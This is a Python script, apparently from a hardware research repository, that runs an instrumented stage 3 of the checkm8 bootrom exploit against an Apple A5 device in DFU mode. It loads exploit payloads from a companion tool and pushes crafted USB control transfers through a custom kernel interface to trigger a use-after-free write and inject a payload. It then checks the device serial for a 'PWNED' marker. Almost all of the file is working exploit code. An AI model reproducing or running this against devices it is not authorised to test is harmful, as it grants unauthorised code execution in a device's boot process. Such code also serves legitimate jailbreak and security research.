#!/usr/bin/env python3
"""stage3-direct2 - instrumented stage 3 on the poisoned-heap DFU.

Identical pushes to stage3-direct, but every CYC is followed by an
IOC_READBACK so the wire truth is visible: does the chip fetch and
serve our TDs on the sprayed heap, and what lands in the module's
coherent staging buffer.
"""
import ctypes
import fcntl
import importlib.util
import os
import struct
import subprocess
import sys
import time

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TOOLS = os.path.join(REPO, 'tools')

sp = importlib.util.spec_from_file_location('pwn', os.path.join(TOOLS, 'checkm8-a5-pwn.py'))
P = importlib.util.module_from_spec(sp)
sp.loader.exec_module(P)

IOC_CYC = (1 << 30) | (32 << 16) | (ord('R') << 8) | 5
IOC_STATE = (2 << 30) | (40 << 16) | (ord('R') << 8) | 3
RB_SIZE = 4 + 4 + 0x1000
IOC_RW = (3 << 30) | (RB_SIZE << 16) | (ord('R') << 8) | 7
IOC_PORTRESET = (3 << 30) | (16 << 16) | (ord('R') << 8) | 12


def cyc(fd, setup, data, settle_us=1000):
    arr = (ctypes.c_ubyte * max(len(data), 1)).from_buffer_copy(
        bytes(data) if data else b'\x00')
    txn = struct.pack('<8sIBBHIIQ', bytes(setup), len(data), 1, 1, 0,
                      settle_us, 0, ctypes.addressof(arr))
    try:
        fcntl.ioctl(fd, IOC_CYC, txn, True)
        return 0
    except OSError as e:
        _ = arr
        return -e.errno


def readback(fd, n=16):
    rb = bytearray(RB_SIZE)
    struct.pack_into('<I', rb, 0, n)
    fcntl.ioctl(fd, IOC_RW, rb, True)
    st, = struct.unpack_from('<I', rb, 4)
    return st, bytes(rb[8:8 + n])


def state(fd):
    buf = bytearray(40)
    fcntl.ioctl(fd, IOC_STATE, buf, True)
    return struct.unpack_from('<QIIIIIIII', buf, 0)


def dmesg_usb_tail(n=8):
    r = subprocess.run(['sudo', '-n', 'dmesg'],
                       capture_output=True, text=True, timeout=10)
    lines = [l for l in r.stdout.split('\n') if 'usb 3-2' in l]
    return lines[-n:]


def main():
    payload, overwrite = P.load_payloads('classic')
    print('*** stage3-direct2: payload=%d overwrite=%d ***'
          % (len(payload), len(overwrite)))

    fd = os.open('/dev/raw0', os.O_RDWR)
    t0 = time.time()
    got = False
    while time.time() - t0 < 30.0:
        f = state(fd)
        if f[5]:
            print('[capture] slot=%d ring=0x%x ep0st=%08x t=%.2fs'
                  % (f[1], f[2], f[8], time.time() - t0))
            got = True
            break
        time.sleep(0.01)
    if not got:
        print('no capture in 30s - PR the wedged port first')
        return 1

    st, data = readback(fd)
    print('[rb baseline] st=%u first16=%s' % (st, data.hex()))

    rc = cyc(fd, bytes([0x80, 0x06, 0x03, 0x03, 0x0A, 0x04, 0x81, 0x00]),
             b'\x00' * 0x41)
    st, data = readback(fd)
    print('[s3] crit-IN CYC rc=%d rb st=%u first16=%s' % (rc, st, data.hex()))
    time.sleep(0.1)

    data_out = b'\xCC' * 0x40 + overwrite
    rc = cyc(fd, bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00]),
             data_out)
    st, data = readback(fd)
    print('[s3] UAF write CYC rc=%d rb st=%u first16=%s' % (rc, st, data.hex()))
    time.sleep(0.3)

    data_out = b'\xCC' * 0x40 + payload
    rc = cyc(fd, bytes([0x21, 0x01, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x02]),
             data_out)
    st, data = readback(fd)
    print('[s3] payload CYC rc=%d rb st=%u first16=%s' % (rc, st, data.hex()))
    time.sleep(0.5)

    buf = bytearray(struct.pack('<IIII', 1, 0, 0, 0))
    fcntl.ioctl(fd, IOC_PORTRESET, buf, True)
    before, after = struct.unpack_from('<II', buf, 4)
    print('[P4] portreset PR: before=%08x after=%08x' % (before, after))

    time.sleep(3.0)
    for l in dmesg_usb_tail():
        print('[dmesg] ' + l)
    usb = P.LibUSB()
    P.LibUSB._current = usb
    serial = P.verify(usb)
    print('[verify] serial: %r' % serial)
    os.close(fd)
    if serial and P.PWN_MARKER in serial:
        print('*** PWNED DFU - host-only checkm8 A5 achieved ***')
        return 0
    return 2


if __name__ == '__main__':
    sys.exit(main())
